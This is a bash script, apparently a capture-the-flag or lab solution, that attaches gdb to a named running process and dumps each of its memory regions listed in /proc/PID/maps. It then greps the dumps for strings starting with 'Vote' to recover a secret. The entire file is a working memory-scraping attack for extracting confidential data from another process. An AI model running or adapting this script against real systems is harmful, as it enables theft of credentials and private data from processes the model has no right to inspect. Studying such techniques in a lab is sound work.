#!/bin/bash

# Usage
if [ $# != 1 ] ; then
    echo "Usage: $0 processname" >&2
    exit 1
fi

# Create a temporary working directory
export WORKDIR=`mktemp -d`
function cleanup() {
    rm -rf $WORKDIR
}
trap cleanup EXIT

# Find the PID
if ! pid=`pgrep -f -o $1` ; then
    echo "Unable to find PID for ${1}" >&2
    exit 1
fi

# Dump memory
while read a b c d e f; do
    [ "$f" == "[vvar]" ] && continue
    start=`echo $a | cut -d- -f1`
    until=`echo $a | cut -d- -f2`
    gdb -q -silent -batch -pid ${pid} \
        -ex "dump memory ${WORKDIR}/${start}-${until}.dump 0x${start} 0x${until}" \
        >/dev/null 2>&1
done < /proc/$pid/maps

# Find the secret
strings $WORKDIR/*.dump | grep '^Vote' | grep -v "Vote ="
